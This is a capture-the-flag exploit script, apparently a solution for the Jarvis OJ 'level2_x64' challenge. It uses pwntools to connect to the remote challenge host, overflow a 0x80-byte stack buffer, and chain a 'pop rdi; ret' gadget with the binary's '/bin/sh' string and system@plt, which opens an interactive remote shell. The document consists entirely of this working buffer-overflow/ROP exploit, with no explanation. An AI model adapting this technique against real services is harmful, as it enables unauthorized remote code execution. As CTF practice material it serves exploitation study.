level2_64x exp
```
from pwn import *
sh = remote('pwn2.jarvisoj.com',9882) 
level = ELF('./level2_x64')
junk = 'a'*0x80
fakebp = 'a'*8

sh_addr=level.search("/bin/sh").next()
sys_addr = level.plt['system']
rdiret = 0x04006b3

payload = junk + fakebp +p64(rdiret)+p64(sh_addr)+p64(sys_addr)
sh.send(payload)
sh.interactive()
```
